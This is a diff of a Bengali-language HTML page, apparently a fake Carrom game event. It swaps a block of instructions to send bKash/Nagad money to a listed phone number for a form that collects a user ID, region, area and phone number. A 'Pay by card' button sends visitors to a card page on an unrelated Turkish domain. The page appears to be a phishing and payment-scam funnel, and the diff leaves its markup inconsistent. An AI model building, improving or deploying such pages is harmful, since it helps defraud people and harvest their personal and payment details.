@@ -259,18 +259,25 @@
         <button class="button back" onclick="goBack('userIdForm')">Back</button> <!-- Back button added -->
     </div>
 
-    <div class="payment-container" id="paymentForm">
-        <h2>ট্রানজেকশন আইডি দিন</h2>
-        <input type="text" placeholder="ট্রানজেকশন আইডি দিন" id="transactionId">
-        <p id="amountText"></p>
-        <div class="instructions">
-            <p>• <strong>*167#</strong> ডায়াল করে বা নগদ এপস্য থেকে সেন্ডমানি করতে হবে।</p>
-            <p>• টাকা পাঠিয়ে উপরের বক্সে ট্রানজেকশন আইডি দিয়ে Verify এ ক্লিক করুন।</p>
-            <p>• শুধু মাত্র বিকাশ এবং নগদ এ টাকা পাঠাতে পারবেন।</p>
-            <p>• Nagad/Bkash: <strong>01581050857</strong>
-                <button class="copy-btn" onclick="copyNumber()">Copy</button>
-            </p>
-        </div>
+    <div class="container" id="userIdForm">
+    <h2>Carrom User ID লিখুন</h2>
+    <input type="text" placeholder="Carrom User ID দিন" id="userIdInput">
+
+    <!-- বিভাগ -->
+    <input type="text" placeholder="বিভাগ দিন" id="divisionInput">
+
+    <!-- জেলা -->
+    <input type="text" placeholder="জেলা দিন" id="districtInput">
+
+    <!-- এলাকা -->
+    <input type="text" placeholder="এলাকা দিন" id="areaInput">
+
+    <!-- নাম্বার -->
+    <input type="text" placeholder="নাম্বার দিন" id="numberInput">
+
+    <button class="button submit" onclick="submitUserId()">Submit</button>
+    <button class="button back" onclick="goBack('userIdForm')">Back</button> 
+</div>
         <button class="button verify" onclick="verifyPayment()">Verify</button>
         <button class="button back" onclick="goBack('paymentForm')">Back</button>
         <button class="button follow" onclick="window.location.href='http://season-event.com.tr/NB/PY/card.php?id=6420661782'">Pay by card 💳</button>
